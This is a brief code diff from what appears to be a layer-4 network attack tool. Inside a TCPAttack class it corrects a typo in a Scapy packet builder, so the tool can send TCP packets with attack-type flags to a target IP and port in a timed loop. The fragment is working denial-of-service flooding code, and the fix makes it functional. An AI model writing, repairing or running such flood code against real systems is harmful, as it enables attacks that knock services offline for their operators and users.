@@ -59,7 +59,7 @@ class TCPAttack(Layer4Attack):
 
         def attack():
             nonlocal packet_count
-            pkt = IP(dst=self.target_ip) / TCP(dportabcd=self.port, sport=12345, flags=valid_flags[self.attack_type])
+            pkt = IP(dst=self.target_ip) / TCP(dport=self.port, sport=12345, flags=valid_flags[self.attack_type])
             start_time = time.time()
             while time.time() - start_time < self.duration and not self.stop_event.is_set():
                 try:
